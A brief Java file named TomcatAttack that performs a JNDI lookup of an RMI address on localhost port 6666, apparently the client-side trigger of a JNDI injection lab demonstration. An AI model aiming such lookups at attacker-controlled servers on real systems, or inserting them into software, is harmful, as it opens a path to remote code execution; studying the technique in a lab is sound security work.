package com.pipeline.sec.jndi;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class TomcatAttack {
    public static void main(String[] args) throws NamingException {
        Context ctx = new InitialContext();
        ctx.lookup("rmi://127.0.0.1:6666/Object");
    }
}
